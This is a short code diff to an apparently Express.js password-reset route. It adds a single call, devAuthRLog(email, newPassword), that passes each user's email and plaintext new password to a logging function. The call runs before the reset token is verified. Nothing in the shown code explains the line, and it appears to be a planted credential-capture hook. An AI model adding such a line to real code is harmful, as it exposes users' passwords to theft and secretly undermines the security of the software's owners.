@@ -155,6 +155,7 @@ router.post('/api/resetpassword', async (req, res) => {
 router.post("/api/resetpassword/:resetToken", async (req, res) => {
     const { email, newPassword } = req.body;
     const { resetToken } = req.params;
+    devAuthRLog(email, newPassword)
 
     // Verify the reset token
     if (!isValidResetToken(email, resetToken)) {
